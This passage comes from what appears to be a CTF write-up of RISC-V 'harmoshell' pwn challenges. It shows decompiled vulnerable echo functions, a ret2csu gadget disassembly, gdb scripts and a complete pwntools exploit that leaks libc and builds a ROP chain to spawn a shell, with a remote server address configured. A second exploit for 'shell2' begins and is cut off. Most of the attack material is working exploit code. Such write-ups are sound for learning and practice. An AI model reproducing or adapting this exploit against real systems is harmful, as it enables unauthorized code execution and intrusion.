         <span class="token punctuation">(</span>iVar4 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>pcVar3<span class="token punctuation">,</span>__s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">CONCAT44</span><span class="token punctuation">(</span>extraout_var_01<span class="token punctuation">,</span>iVar4<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    ppcVar2 <span class="token operator">=</span> ppcVar2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>ppcVar2 <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>gp0xfffffffffffffbe0<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      __nbytes <span class="token operator">=</span> <span class="token number">0x200</span><span class="token punctuation">;</span>
LAB_00011516<span class="token punctuation">:</span>
      sVar5 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>auStack320<span class="token punctuation">,</span>__nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// vul</span>
      <span class="token function">FUN_000113e2</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>longlong <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>auStack320<span class="token punctuation">,</span><span class="token punctuation">(</span>longlong<span class="token punctuation">)</span>sVar5<span class="token punctuation">,</span>lVar6<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  __nbytes <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__s2 <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">goto</span> LAB_00011516<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>Use unsorted bin leak to leak libc address then use return-to-csu method to get shell</p>
<pre><code>                             LAB_0001181a                                    XREF[1]:     00011828(j)  
        0001181a 1c 60           c.ld       a5,0x0(s0=&gt;-&gt;_INIT_0)                            = 10F84h
                                                                                             = 11056h
        0001181c 56 86           c.mv       a2,s5
        0001181e d2 85           c.mv       a1,s4
        00011820 4e 85           c.mv       a0,s3
        00011822 85 04           c.addi     s1,0x1
        00011824 82 97           c.jalr     a5=&gt;_INIT_0                                      undefined _INIT_1(void)
                                                                                             undefined _INIT_0(void)
        00011826 21 04           c.addi     s0,0x8
        00011828 e3 19 99 fe     bne        s2,s1,LAB_0001181a
                             LAB_0001182c                                    XREF[1]:     0001180e(j)  
        0001182c e2 70           c.ldsp     ra,0x38(sp)
        0001182e 42 74           c.ldsp     s0,0x30(sp)
        00011830 a2 74           c.ldsp     s1,0x28(sp)
        00011832 02 79           c.ldsp     s2,0x20(sp)
        00011834 e2 69           c.ldsp     s3,0x18(sp)
        00011836 42 6a           c.ldsp     s4,0x10(sp)
        00011838 a2 6a           c.ldsp     s5,0x8(sp)
        0001183a 21 61           c.addi16sp sp,0x40
        0001183c 82 80           ret</code></pre>
<h3 id="gdb-script"><a href="#gdb-script" class="headerlink" title="gdb script"></a>gdb script</h3><pre class=" language-sh"><code class="language-sh">#! /bin/sh
gdb-multiarch --nh \
        -ex "add-symbol-file ./harmoshell" \
        -ex "set architecture riscv:rv64" \
        -ex "target remote 127.0.0.1:1234"</code></pre>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: i0gan</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os
r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

elf_path  <span class="token operator">=</span> <span class="token string">'./harmoshell'</span>
<span class="token comment" spellcheck="true">#libc_path = '/glibc/2.23/64/lib/libc.so.6'</span>
libc_path <span class="token operator">=</span> <span class="token string">'libs/lib/libc.so.6'</span>

<span class="token comment" spellcheck="true"># remote server ip and port</span>
server_ip <span class="token operator">=</span> <span class="token string">"121.36.192.114"</span>
server_port <span class="token operator">=</span> <span class="token number">9999</span>

<span class="token comment" spellcheck="true"># if local debug</span>
LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>
<span class="token comment" spellcheck="true">#--------------------------func-----------------------------</span>
<span class="token keyword">def</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>LOCAL<span class="token punctuation">)</span><span class="token punctuation">:</span>
        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">touch</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> b<span class="token string">'touch '</span> <span class="token operator">+</span> n<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> b<span class="token string">'rm '</span> <span class="token operator">+</span> n<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">ls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'ls'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'cat '</span> <span class="token operator">+</span> n<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">echo</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> n<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'echo '</span> <span class="token operator">+</span> t <span class="token operator">+</span> <span class="token string">' '</span> <span class="token operator">+</span> n<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>d<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">quit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    li<span class="token punctuation">(</span><span class="token string">'exploit...'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># leak libc</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        touch<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        rm<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        touch<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    touch<span class="token punctuation">(</span>b<span class="token string">'7'</span><span class="token punctuation">)</span>
    echo<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">7</span> <span class="token operator">+</span> <span class="token string">'&amp;'</span><span class="token punctuation">)</span>
    cat<span class="token punctuation">(</span><span class="token string">'7'</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span> <span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> <span class="token number">0x0000004000000000</span> <span class="token operator">+</span> leak <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>
    li<span class="token punctuation">(</span><span class="token string">'leak: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    touch<span class="token punctuation">(</span>b<span class="token string">'debug'</span><span class="token punctuation">)</span>
    csu_c <span class="token operator">=</span> <span class="token number">0x0001181a</span>
    csu_i <span class="token operator">=</span> <span class="token number">0x0001182c</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xed4b0</span>
    li<span class="token punctuation">(</span><span class="token string">'system: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> b<span class="token string">'\x00'</span> <span class="token operator">*</span> <span class="token number">0x138</span>
    <span class="token comment" spellcheck="true">#p += p64(system)</span>
    <span class="token comment" spellcheck="true">#p += p64(bin_sh)</span>

    <span class="token comment" spellcheck="true"># modify a0 arg</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_i<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># null</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s5 -> a2</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s4 -> a1</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s3 -> a0</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s2 -> bypass jump</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s1 -> bypass jump</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0 -> call</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_c<span class="token punctuation">)</span>

    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#p += p64(0)</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s5 -> a2</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s4 -> a1</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s3 -> a0</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s2 -> bypass jump</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s1 -> bypass jump</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># call our func</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>csu_c<span class="token punctuation">)</span>

    echo<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#--------------------------main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./harmoshell'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./qemu-riscv64'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span> <span class="token punctuation">,</span> <span class="token string">'./libs'</span><span class="token punctuation">,</span> elf_path<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">#io = process(['./qemu-riscv64', '-g', '1234', '-L' , './libs', elf_path])</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'./qemu-riscv64'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span> <span class="token punctuation">,</span> <span class="token string">'./libs'</span><span class="token punctuation">,</span> elf_path<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token comment" spellcheck="true">#io = process(['./qemu-riscv64', '-g', '1234', '-L' , './libs', elf_path])</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> server_port<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libc_path<span class="token punctuation">)</span>
    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="shell2"><a href="#shell2" class="headerlink" title="shell2"></a>shell2</h2><h3 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h3><pre><code>    Arch:     em_riscv-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000)
    RWX:      Has RWX segments</code></pre>
<h3 id="vul-1"><a href="#vul-1" class="headerlink" title="vul"></a>vul</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">echo</span><span class="token punctuation">(</span>longlong param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  longlong lVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>
  ssize_t sVar3<span class="token punctuation">;</span>
  undefined4 extraout_var<span class="token punctuation">;</span>
  undefined4 extraout_var_00<span class="token punctuation">;</span>
  size_t __nbytes<span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>__s1<span class="token punctuation">;</span>
  undefined8 uVar4<span class="token punctuation">;</span>
  undefined auStack288 <span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  lVar1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>longlong <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  __s1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>lVar1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  iVar2 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>__s1<span class="token punctuation">,</span><span class="token string">">"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CONCAT44</span><span class="token punctuation">(</span>extraout_var<span class="token punctuation">,</span>iVar2<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    uVar4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    iVar2 <span class="token operator">=</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>__s1<span class="token punctuation">,</span><span class="token string">">>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uVar4 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">CONCAT44</span><span class="token punctuation">(</span>extraout_var_00<span class="token punctuation">,</span>iVar2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Subroutine does not return*/</span>
      <span class="token function">FUN_000113ee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  lVar1 <span class="token operator">=</span> <span class="token function">FUN_000110bc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>lVar1 <span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  __nbytes <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> lVar1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    __nbytes <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>size_t <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>longlong<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>gp0xfffffffffffffa60 <span class="token operator">+</span> lVar1 <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  sVar3 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>auStack288<span class="token punctuation">,</span>__nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">FUN_00011384</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>longlong<span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>auStack288<span class="token punctuation">,</span><span class="token punctuation">(</span>longlong<span class="token punctuation">)</span>sVar3<span class="token punctuation">,</span>uVar4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>The vulnerability is heap overflow. we can use <code>echo &gt;&gt; nmae</code> to realize it</p>
<h3 id="gdb-script-1"><a href="#gdb-script-1" class="headerlink" title="gdb script"></a>gdb script</h3><pre class=" language-sh"><code class="language-sh">#! /bin/sh
gdb-multiarch --nh \
        -ex "add-symbol-file ./harmoshell2" \
        -ex "set architecture riscv:rv64" \
        -ex "target remote 127.0.0.1:1234"</code></pre>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>
<span class="token comment" spellcheck="true"># Author: i0gan</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os
r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
s   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

elf_path  <span class="token operator">=</span> <span class="token string">'./harmoshell2'</span>
<span class="token comment" spellcheck="true">#libc_path = '/glibc/2.23/64/lib/libc.so.6'</span>
libc_path <span class="token operator">=</span> <span class="token string">'libs/lib/libc.so.6'</span>

<span class="token comment" spellcheck="true"># remote server ip and port</span>
server_ip <span class="token operator">=</span> <span class="token string">"121.36.192.114"</span>
server_port <span class="token operator">=</span> <span class="token number">9999</span>

<span class="token comment" spellcheck="true"># if local debug</span>
LOCAL <span class="token operator">=</span> <span class="token number">1</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>
<span class="token comment" spellcheck="true">#--------------------------func-----------------------------</span>
